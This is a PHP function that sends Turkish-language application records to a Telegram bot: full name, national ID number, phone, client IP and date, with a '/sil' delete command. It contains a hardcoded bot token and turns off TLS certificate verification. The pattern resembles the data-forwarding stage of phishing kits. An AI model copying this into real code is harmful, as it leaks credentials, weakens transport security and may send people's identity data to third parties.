<?php
declare(strict_types=1);

function sendTelegramNotification(array $application, string $phone = ''): bool
{
    $token = '8543060508:AAGHfDEY3NxCDyHmfJ_HAY1_uGCinI_syPY';
    $chatId = getenv('TELEGRAM_CHAT_ID') ?: '';
    if ($chatId === '') return false;

    $id = $application['id'] ?? '?';
    $fullName = $application['full_name'] ?? '';
    $tckn = $application['national_id'] ?? $application['user_code'] ?? '';
    $phoneDisplay = $phone ?: $application['phone'] ?? '';
    $tip = $application['tip'] ?? 'bireysel';
    $status = $application['status'] ?? 'beklemede';
    $ip = $application['client_ip'] ?? '';
    $createdAt = $application['created_at'] ?? '';

    $msg = "";
    $msg .= "$id\n";
    if ($fullName !== '') {
        $msg .= "$fullName\n";
    }
    $msg .= "TCK: $tckn\n";
    if ($phoneDisplay !== '') {
        $msg .= "Tel: $phoneDisplay\n";
    }
    $msg .= "Tip: $tip\n";
    $msg .= "Durum: $status\n";
    $msg .= "IP: $ip\n";
    $msg .= "Tarih: $createdAt\n";
    $msg .= "\n/sil $id";

    $url = "https://api.telegram.org/bot{$token}/sendMessage";

    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => [
            'chat_id' => $chatId,
            'text' => $msg,
            'disable_web_page_preview' => true,
        ],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_SSL_VERIFYPEER => false,
    ]);
    $resp = curl_exec($ch);
    $http = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    unset($ch);

    return $http >= 200 && $http < 300;
}
